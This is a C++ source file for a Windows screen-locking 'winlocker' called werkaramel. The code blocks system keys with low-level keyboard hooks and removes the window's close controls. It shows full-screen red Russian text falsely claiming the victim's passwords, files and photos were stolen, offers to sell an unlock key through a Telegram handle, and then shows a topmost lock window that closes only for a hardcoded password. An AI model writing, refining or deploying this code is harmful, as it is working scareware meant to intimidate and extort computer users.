// language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
// werkaramel — single console, all phases in one process
#include <windows.h>
#include <string>
#include <thread>
#include <chrono>
#include <random>

const std::wstring PASS = L"123";

HHOOK g_kbHook = nullptr;
HANDLE g_hOut = INVALID_HANDLE_VALUE;
HANDLE g_hIn = INVALID_HANDLE_VALUE;
HWND g_hCon = nullptr;
std::wstring g_input;
std::mt19937 g_rng(std::random_device{}());

int RandInt(int lo, int hi) {
    std::uniform_int_distribution<int> d(lo, hi);
    return d(g_rng);
}

const std::wstring SCENE_TEXT =
    L"не пытайтесь что-то сделать сейчас. будет хуже.\n"
    L"\n"
    L"вы скачали winlocker werkaramel. это не игрушка.\n"
    L"уже поздно. всё что нужно — сделано.\n"
    L"\n"
    L"все ваши данные скопированы. пароли, файлы, фото, переписки.\n"
    L"всё это уже на нашем сервере.\n"
    L"\n"
    L"не выключайте компьютер. не трогайте диспетчер задач.\n"
    L"не пытайтесь снять задачу. система отслеживает любые действия.\n"
    L"\n"
    L"попытка закрыть это окно = немедленная блокировка.\n"
    L"попытка перезагрузить = потеря данных навсегда.\n"
    L"\n"
    L"оставайтесь на месте. дальнейшие инструкции появятся ниже.";

void WOut(const std::wstring& s) {
    DWORD w = 0;
    WriteConsoleW(g_hOut, s.c_str(), (DWORD)s.size(), &w, nullptr);
}
void SetColor(WORD attr) { SetConsoleTextAttribute(g_hOut, attr); }
void ClearScreen(WORD bg = 0) {
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    DWORD cells, w;
    COORD home = {0, 0};
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    cells = csbi.dwSize.X * csbi.dwSize.Y;
    FillConsoleOutputCharacterW(g_hOut, L' ', cells, home, &w);
    FillConsoleOutputAttribute(g_hOut, bg, cells, home, &w);
    SetConsoleCursorPosition(g_hOut, home);
}
void Gotoxy(int x, int y) {
    COORD c{ (SHORT)x, (SHORT)y };
    SetConsoleCursorPosition(g_hOut, c);
}

BOOL WINAPI CtrlHandler(DWORD type) {
    if (type == CTRL_C_EVENT) return TRUE;
    return FALSE;
}

void LockConsole() {
    HMENU menu = GetSystemMenu(g_hCon, FALSE);
    if (menu) {
        DeleteMenu(menu, SC_CLOSE, MF_BYCOMMAND);
        DeleteMenu(menu, SC_MINIMIZE, MF_BYCOMMAND);
        DeleteMenu(menu, SC_MAXIMIZE, MF_BYCOMMAND);
    }
    SetConsoleCtrlHandler(CtrlHandler, TRUE);

    CONSOLE_FONT_INFOEX cfi{};
    cfi.cbSize = sizeof(cfi);
    cfi.dwFontSize.Y = 18;
    cfi.dwFontSize.X = 9;
    wcscpy_s(cfi.FaceName, L"Consolas");
    SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);
}

void FullscreenConsole() {
    LONG style = GetWindowLong(g_hCon, GWL_STYLE);
    style &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZEBOX |
               WS_MAXIMIZEBOX | WS_SYSMENU | WS_OVERLAPPED);
    style |= WS_POPUP;
    SetWindowLong(g_hCon, GWL_STYLE, style);

    LONG exStyle = GetWindowLong(g_hCon, GWL_EXSTYLE);
    exStyle &= ~(WS_EX_WINDOWEDGE | WS_EX_CLIENTEDGE | WS_EX_DLGMODALFRAME);
    SetWindowLong(g_hCon, GWL_EXSTYLE, exStyle);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    ShowWindow(g_hCon, SW_HIDE);
    SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, sw, sh,
                 SWP_FRAMECHANGED | SWP_SHOWWINDOW | SWP_NOACTIVATE);
    ShowWindow(g_hCon, SW_SHOWNORMAL);
    SetForegroundWindow(g_hCon);
    SetFocus(g_hCon);
    SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, sw, sh, SWP_NOMOVE | SWP_NOSIZE);
}

LRESULT CALLBACK BlockHook(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION) {
        auto* kb = (KBDLLHOOKSTRUCT*)lp;
        DWORD vk = kb->vkCode;
        if (vk == VK_LWIN || vk == VK_RWIN) return 1;
        if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_ESCAPE) return 1;
        if (vk == VK_F11) return 1;
    }
    return CallNextHookEx(nullptr, code, wp, lp);
}

LRESULT CALLBACK BlockAllHook(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION) return 1;
    return CallNextHookEx(nullptr, code, wp, lp);
}

// ═══════════════════════════════════════════════════════════
// ФАЗА 1: КРАСНЫЙ FLASH
// ═══════════════════════════════════════════════════════════
void PhaseRed() {
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
                                 GetModuleHandleW(nullptr), 0);

    for (int i = 0; i < 12; ++i) {
        ClearScreen(BACKGROUND_RED | BACKGROUND_INTENSITY);
        std::this_thread::sleep_for(std::chrono::milliseconds(80));
        ClearScreen(0);
        std::this_thread::sleep_for(std::chrono::milliseconds(80));
    }

    ClearScreen(BACKGROUND_RED | BACKGROUND_INTENSITY);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X, rows = csbi.dwSize.Y;
    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    std::wstring txt = L"В А С   З А М Е Т И Л И";
    Gotoxy((cols - (int)txt.size()) / 2, rows / 2);
    WOut(txt);
    std::this_thread::sleep_for(std::chrono::seconds(1));

    UnhookWindowsHookEx(g_kbHook);
    g_kbHook = nullptr;
}

// ═══════════════════════════════════════════════════════════
// ФАЗА 2: КРАСНЫЕ ПРАВИЛА
// ═══════════════════════════════════════════════════════════
void PhaseRules() {
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
                                 GetModuleHandleW(nullptr), 0);

    ClearScreen(0);
    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    Gotoxy(2, 2);

    int col = 2, row = 2;
    for (size_t i = 0; i < SCENE_TEXT.size(); ++i) {
        wchar_t c = SCENE_TEXT[i];
        if (c == L'\n') {
            col = 2; row++; Gotoxy(col, row);
        } else {
            WOut(std::wstring(1, c)); col++;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(35));
    }

    // держим текст 5 секунд
    std::this_thread::sleep_for(std::chrono::seconds(5));

    UnhookWindowsHookEx(g_kbHook);
    g_kbHook = nullptr;
}

// ═══════════════════════════════════════════════════════════
// ФАЗА 3: ЗЕЛЁНОЕ МЕНЮ
// ═══════════════════════════════════════════════════════════
const wchar_t* BANNER[] = {
    L"██╗    ██╗███████╗██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ███╗   ███╗███████╗██╗",
    L"██║    ██║██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗████╗ ████║██╔════╝██║",
    L"██║ █╗ ██║█████╗  ██████╔╝█████╔╝ ███████║██████╔╝███████║██╔████╔██║█████╗  ██║",
    L"██║███╗██║██╔══╝  ██╔══██╗██╔═██╗ ██╔══██║██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║",
    L"╚███╔███╔╝███████╗██║  ██║██║  ██╗██║  ██║██║  ██║██║  ██║██║ ╚═╝ ██║███████╗███████╗",
    L" ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝",
};

void PrintMenu() {
    ClearScreen(0);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int rows = csbi.dwSize.Y;

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    for (int i = 0; i < 6; ++i) {
        Gotoxy(2, 1 + i);
        WOut(BANNER[i]);
    }

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(2, 8);
    WOut(L"                        W I N L O C K E R");

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(2, 10);
    std::wstring line(78, L'─');
    WOut(line);

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    Gotoxy(4, 12); WOut(L"Выберите действие:");

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(4, 14); WOut(L"[ 1 ]   Поддержка  ->  tg @werkaramel");
    Gotoxy(4, 15); WOut(L"[ 2 ]   Купить ключ");
    Gotoxy(4, 16); WOut(L"[ 3 ]   Выйти");

    SetColor(FOREGROUND_GREEN);
    Gotoxy(4, rows - 4); WOut(L"введите число и нажмите Enter");

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(4, rows - 2); WOut(L"> ");
    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    WOut(g_input + L"  ");
}

void PhaseMenu() {
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockHook,
                                 GetModuleHandleW(nullptr), 0);

    PrintMenu();

    INPUT_RECORD rec;
    DWORD read = 0;

    while (true) {
        if (!ReadConsoleInputW(g_hIn, &rec, 1, &read)) {
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
            continue;
        }
        if (rec.EventType != KEY_EVENT) continue;
        if (!rec.Event.KeyEvent.bKeyDown) continue;

        wchar_t c = rec.Event.KeyEvent.uChar.UnicodeChar;
        if (c == 0) continue;

        if (c >= L'0' && c <= L'9') {
            g_input += c;
            PrintMenu();
        } else if (c == L'\b') {
            if (!g_input.empty()) g_input.pop_back();
            PrintMenu();
        } else if (c == L'\r') {
            if (g_input == L"1" || g_input == L"2" || g_input == L"3") {
                UnhookWindowsHookEx(g_kbHook);
                g_kbHook = nullptr;
                return;  // переход к локеру
            } else {
                g_input.clear();
                PrintMenu();
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════
// ФАЗА 4: WINLOCKER (графическое окно поверх консоли)
// ═══════════════════════════════════════════════════════════
const COLORREF C_BG = RGB(0, 0, 0);
const COLORREF C_RED = RGB(220, 30, 30);
const COLORREF C_FG = RGB(255, 255, 255);
const COLORREF C_DIM = RGB(120, 120, 120);
std::wstring g_locker_input;
bool g_locker_wrong = false;

void DrawL(HDC dc, int x, int y, const std::wstring& s, COLORREF c,
           int size, bool bold = false, bool center = false, int winW = 0) {
    HFONT font = CreateFontW(size, 0, 0, 0, bold ? FW_BOLD : FW_NORMAL,
                             FALSE, FALSE, FALSE, DEFAULT_CHARSET,
                             OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                             CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
    HFONT old = (HFONT)SelectObject(dc, font);
    SetTextColor(dc, c);
    SetBkMode(dc, TRANSPARENT);
    if (center) {
        SIZE sz;
        GetTextExtentPoint32W(dc, s.c_str(), (int)s.size(), &sz);
        x = (winW - sz.cx) / 2;
    }
    TextOutW(dc, x, y, s.c_str(), (int)s.size());
    SelectObject(dc, old);
    DeleteObject(font);
}

void LockerPaint(HWND hwnd) {
    PAINTSTRUCT ps;
    HDC dc = BeginPaint(hwnd, &ps);
    RECT rc; GetClientRect(hwnd, &rc);
    HBRUSH bg = CreateSolidBrush(C_BG);
    FillRect(dc, &rc, bg);
    DeleteObject(bg);
    int cx = rc.right / 2;
    DrawL(dc, 0, 60, L"WERKARAMEL", C_RED, 60, true, true, rc.right);
    for (int x = cx - 300; x < cx + 300; x += 14)
        DrawL(dc, x, 150, L"▬", C_RED, 12);
    DrawL(dc, 0, 200, L"SYSTEM LOCKED", C_RED, 110, true, true, rc.right);
    DrawL(dc, 0, 340, L"введите пароль для разблокировки", C_DIM, 24, false, true, rc.right);
    DrawL(dc, 0, 380, L"tg: @werkaramel", C_RED, 26, false, true, rc.right);
    int boxW = 600, boxH = 80;
    int boxX = cx - boxW / 2;
    int boxY = rc.bottom / 2 + 60;
    RECT box{ boxX, boxY, boxX + boxW, boxY + boxH };
    HBRUSH bf = CreateSolidBrush(RGB(20, 20, 20));
    FillRect(dc, &box, bf);
    DeleteObject(bf);
    FrameRect(dc, &box, (HBRUSH)GetStockObject(WHITE_BRUSH));
    std::wstring masked(g_locker_input.size(), L'*');
    DrawL(dc, boxX + 30, boxY + 22, masked, C_FG, 40);
    if (g_locker_wrong) {
        DrawL(dc, 0, boxY + boxH + 30, L"НЕВЕРНЫЙ ПАРОЛЬ", C_RED, 28, true, true, rc.right);
    } else {
        DrawL(dc, 0, boxY + boxH + 30, L"[ Enter ]  разблокировать", C_DIM, 22, false, true, rc.right);
    }
    EndPaint(hwnd, &ps);
}

LRESULT CALLBACK LockerProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_PAINT: LockerPaint(hwnd); return 0;
    case WM_KEYDOWN:
        if (wp == VK_F4 && (GetKeyState(VK_MENU) & 0x8000)) return 0;
        if (wp == VK_ESCAPE) return 0;
        return 0;
    case WM_SYSCOMMAND:
        if ((wp & 0xFFF0) == SC_CLOSE) return 0;
        if ((wp & 0xFFF0) == SC_MINIMIZE) return 0;
        if ((wp & 0xFFF0) == SC_KEYMENU) return 0;
        return 0;
    case WM_CLOSE: return 0;
    case WM_CHAR:
        if (wp == VK_BACK) {
            if (!g_locker_input.empty()) g_locker_input.pop_back();
            g_locker_wrong = false;
        } else if (wp == VK_RETURN) {
            if (g_locker_input == PASS) {
                PostQuitMessage(0);
            } else {
                g_locker_input.clear();
                g_locker_wrong = true;
                MessageBeep(MB_ICONHAND);
            }
        } else if (wp >= 32) {
            g_locker_input.push_back((wchar_t)wp);
            g_locker_wrong = false;
        }
        InvalidateRect(hwnd, nullptr, FALSE);
        return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

void PhaseLocker() {
    // скрываем консоль
    ShowWindow(g_hCon, SW_HIDE);

    WNDCLASSW wc{};
    wc.lpfnWndProc = LockerProc;
    wc.hInstance = GetModuleHandleW(nullptr);
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"werka_locker";
    RegisterClassW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST, L"werka_locker", L"System Locked",
        WS_POPUP, 0, 0, sw, sh, nullptr, nullptr,
        GetModuleHandleW(nullptr), nullptr);

    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    SetForegroundWindow(hwnd);
    SetFocus(hwnd);

    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockHook,
                                 GetModuleHandleW(nullptr), 0);

    MSG m;
    while (GetMessageW(&m, nullptr, 0, 0)) {
        TranslateMessage(&m);
        DispatchMessageW(&m);
    }

    UnhookWindowsHookEx(g_kbHook);
}

// ═══════════════════════════════════════════════════════════
// ГЛАВНАЯ
// ═══════════════════════════════════════════════════════════
int wmain() {
    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    g_hIn = GetStdHandle(STD_INPUT_HANDLE);
    g_hCon = GetConsoleWindow();
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);

    DWORD mode = 0;
    GetConsoleMode(g_hIn, &mode);
    SetConsoleMode(g_hIn, mode | ENABLE_ECHO_INPUT | ENABLE_LINE_INPUT | ENABLE_PROCESSED_INPUT);

    FullscreenConsole();
    LockConsole();

    // небольшая пауза и повторная фиксация фуллскрина
    std::this_thread::sleep_for(std::chrono::milliseconds(150));
    FullscreenConsole();

    PhaseRed();
    PhaseRules();
    PhaseMenu();
    PhaseLocker();

    return 0;
}
